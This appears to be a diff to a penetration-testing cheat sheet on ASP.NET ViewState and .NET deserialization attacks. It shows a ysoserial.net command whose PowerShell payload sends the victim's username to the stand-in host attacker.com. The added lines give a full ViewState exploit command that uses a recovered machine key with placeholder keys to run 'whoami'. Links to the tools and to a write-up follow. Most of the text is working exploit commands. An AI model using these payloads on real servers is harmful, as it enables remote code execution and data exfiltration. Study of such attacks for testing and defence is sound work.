@@ -185,7 +185,11 @@ Look for serialized Java magic bytes in traffic/cookies to spot candidates: `AC 
 **Example:**
 ```
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
-ysoserial.exe -p ViewState    # list ViewState-specific plugin options
+
+# -p ViewState is the plugin that crafts a full __VIEWSTATE payload once a machine key is known;
+# it requires the recovered key/algorithm params below, not just "-p ViewState" on its own:
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" --apppath="/" --path="/default.aspx" \
+  --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>" --validationalg="SHA1" --validationkey="<VALIDATION_KEY>"
 ```
 
 **Reference:** https://github.com/pwntester/ysoserial.net · https://github.com/NotSoSecure/Blacklist3r (machine-key recovery) · https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet
